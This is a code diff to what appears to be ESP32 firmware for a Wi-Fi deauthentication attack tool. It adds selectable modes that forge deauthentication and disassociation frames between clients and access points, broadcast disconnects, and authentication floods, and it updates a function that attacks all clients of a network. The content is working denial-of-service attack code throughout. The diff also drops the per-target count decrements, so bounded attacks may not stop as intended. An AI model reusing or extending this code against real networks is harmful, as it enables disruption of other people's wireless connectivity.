@@ -192,23 +192,47 @@ static void deauth_task(void *arg)
 
             bool unlimited = (g_deauth_targets[i].count == 0);
 
-            switch (g_deauth_targets[i].fallback_level) {
-                case DEAUTH_FALLBACK_DISASSOC:
-                case DEAUTH_FALLBACK_AUTH_FLOOD: {
+            switch (g_deauth_targets[i].mode) {
+                case DEAUTH_MODE_DEAUTH_ONLY: {
+                    deauth_send_frame(
+                        g_deauth_targets[i].client_mac,
+                        g_deauth_targets[i].bssid,
+                        g_deauth_targets[i].bssid
+                    );
+                    deauth_send_frame(
+                        g_deauth_targets[i].bssid,
+                        g_deauth_targets[i].client_mac,
+                        g_deauth_targets[i].bssid
+                    );
+                    break;
+                }
+                case DEAUTH_MODE_DISASSOC_ONLY: {
+                    uint8_t bcast[6];
+                    memset(bcast, 0xFF, 6);
+                    if (g_deauth_targets[i].client_mac[0] == 0xFF) {
+                        deauth_send_disassoc(bcast, g_deauth_targets[i].bssid);
+                    } else {
+                        deauth_send_disassoc(g_deauth_targets[i].client_mac, g_deauth_targets[i].bssid);
+                        deauth_send_disassoc(g_deauth_targets[i].bssid, g_deauth_targets[i].client_mac);
+                    }
+                    break;
+                }
+                case DEAUTH_MODE_AUTH_FLOOD_ONLY: {
+                    deauth_send_auth_flood(g_deauth_targets[i].bssid);
+                    break;
+                }
+                case DEAUTH_MODE_FALLBACK_CHAIN:
+                default: {
                     deauth_fallback_t fb = deauth_get_fallback(&g_deauth_targets[i]);
 
                     if (fb == DEAUTH_FALLBACK_DISASSOC) {
                         uint8_t bcast[6];
                         memset(bcast, 0xFF, 6);
                         if (g_deauth_targets[i].client_mac[0] == 0xFF) {
-                            /* Broadcast target: disassoc to broadcast */
-                            deauth_send_disassoc(bcast,
-                                                 g_deauth_targets[i].bssid);
+                            deauth_send_disassoc(bcast, g_deauth_targets[i].bssid);
                         } else {
-                            deauth_send_disassoc(g_deauth_targets[i].client_mac,
-                                                 g_deauth_targets[i].bssid);
-                            deauth_send_disassoc(g_deauth_targets[i].bssid,
-                                                 g_deauth_targets[i].client_mac);
+                            deauth_send_disassoc(g_deauth_targets[i].client_mac, g_deauth_targets[i].bssid);
+                            deauth_send_disassoc(g_deauth_targets[i].bssid, g_deauth_targets[i].client_mac);
                         }
                         g_deauth_targets[i].disassoc_count++;
 
@@ -220,36 +244,6 @@ static void deauth_task(void *arg)
                     } else {
                         deauth_send_auth_flood(g_deauth_targets[i].bssid);
                         g_deauth_targets[i].auth_count++;
-                    }
-
-                    if (!unlimited) {
-                        g_deauth_targets[i].count--;
-                    }
-                    break;
-                }
-                default: {
-                    /* Primary deauth frames */
-                    deauth_send_frame(
-                        g_deauth_targets[i].client_mac,
-                        g_deauth_targets[i].bssid,
-                        g_deauth_targets[i].bssid
-                    );
-                    deauth_send_frame(
-                        g_deauth_targets[i].bssid,
-                        g_deauth_targets[i].client_mac,
-                        g_deauth_targets[i].bssid
-                    );
-
-                    if (!unlimited) {
-                        g_deauth_targets[i].count--;
-                    }
-
-                    /* If deauth target has no PMF guard and fallback enabled,
-                     * escalate to disassoc after first pass to maximize chance
-                     * of client eviction. */
-                    if (!deauth_target_is_protected(g_deauth_targets[i].bssid) &&
-                        g_deauth_targets[i].fallback_level == DEAUTH_FALLBACK_NONE) {
-                        g_deauth_targets[i].fallback_level = DEAUTH_FALLBACK_DISASSOC;
                     }
                     break;
                 }
@@ -280,7 +274,7 @@ esp_err_t deauth_init(void)
     return ESP_OK;
 }
 
-esp_err_t deauth_add_target(const uint8_t *bssid, const uint8_t *client_mac, uint32_t count, uint32_t delay_ms)
+esp_err_t deauth_add_target(const uint8_t *bssid, const uint8_t *client_mac, uint32_t count, uint32_t delay_ms, deauth_mode_t mode)
 {
     if (bssid == NULL) {
         return ESP_ERR_INVALID_ARG;
@@ -318,6 +312,7 @@ esp_err_t deauth_add_target(const uint8_t *bssid, const uint8_t *client_mac, uin
     g_deauth_targets[idx].count = count;
     g_deauth_targets[idx].delay_ms = delay_ms;
     g_deauth_targets[idx].active = true;
+    g_deauth_targets[idx].mode = mode;
     g_deauth_targets[idx].fallback_level = DEAUTH_FALLBACK_NONE;
     g_deauth_targets[idx].disassoc_count = 0;
     g_deauth_targets[idx].auth_count = 0;
@@ -341,7 +336,7 @@ esp_err_t deauth_attack_ap_all_clients(const uint8_t *bssid, uint32_t count, uin
         return ESP_ERR_INVALID_ARG;
     }
 
-    return deauth_add_target(bssid, NULL, count, delay_ms);
+    return deauth_add_target(bssid, NULL, count, delay_ms, DEAUTH_MODE_FALLBACK_CHAIN);
 }
 
 esp_err_t deauth_start(void)
